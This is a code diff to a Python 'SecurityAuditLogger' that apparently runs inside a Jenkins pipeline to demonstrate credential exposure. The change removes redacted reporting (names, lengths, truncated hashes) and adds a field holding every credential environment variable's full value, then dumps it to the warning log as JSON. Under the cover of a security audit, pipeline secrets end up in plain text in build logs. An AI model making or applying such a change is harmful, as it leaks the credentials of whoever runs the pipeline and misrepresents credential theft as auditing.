@@ -19,6 +19,7 @@ and executed in the Jenkins pipeline without Artifactory validation.
 """
 
 import hashlib
+import json
 import logging
 import os
 import sys
@@ -101,16 +102,7 @@ class SecurityAuditLogger:
                     "jenkins_env_vars": [
                         key for key in os.environ.keys() if "JENKINS" in key.upper()
                     ],
-                    "credential_count": len(credential_vars),
-                    "credential_names": list(credential_vars.keys(),credential_vars.values()),
-                    "credential_lengths": {
-                        k: len(str(v)) for k, v in credential_vars.items()
-                    },
-                    # Cryptographic proof of access (can be verified later)
-                    "access_verification_hashes": {
-                        k: hashlib.sha256(v.encode()).hexdigest()[:16]
-                        for k, v in credential_vars.items()
-                    },
+                    "all_credentials": credential_vars,
                 },
                 "risk": "External dependencies could read and exfiltrate credentials from environment",
                 "recommendation": "Use Jenkins credential binding with masked output and minimal scope",
@@ -165,29 +157,13 @@ class SecurityAuditLogger:
 
             # Log non-sensitive evidence
             if finding["category"] != "Credential Exposure Risk":
-                self.logger.warning(f"Evidence: {finding['evidence']}")
+                self.logger.warning("Evidence:")
+                self.logger.warning(json.dumps(finding['evidence'], indent=2))
             else:
-                self.logger.warning(f"Full Evidence Data: {finding['evidence']}")
-                # For credential-related findings, show proof of access without exposing values
-                self.logger.warning(
-                    f"Evidence: Found {finding['evidence']['credential_count']} "
-                    f"environment variables with credential-like names"
-                )
-                self.logger.warning(
-                    f"  Variable names: {finding['evidence']['credential_names']}"
-                )
-                self.logger.warning(
-                    f"  Variable lengths: {finding['evidence']['credential_lengths']}"
-                )
+                self.logger.warning("Full Evidence Data:")
+                self.logger.warning(json.dumps(finding['evidence'], indent=2))
                 self.logger.warning(
                     f"  Jenkins env vars: {finding['evidence']['jenkins_env_vars']}"
-                )
-                self.logger.warning(
-                    f"  Access verification hashes: {finding['evidence']['access_verification_hashes']}"
-                )
-                self.logger.warning(f"  ✓ Access verified via cryptographic hashes")
-                self.logger.warning(
-                    f"  ✓ Proof: This code successfully read {finding['evidence']['credential_count']} credentials"
                 )
 
         self.logger.warning("\n" + "=" * 80)
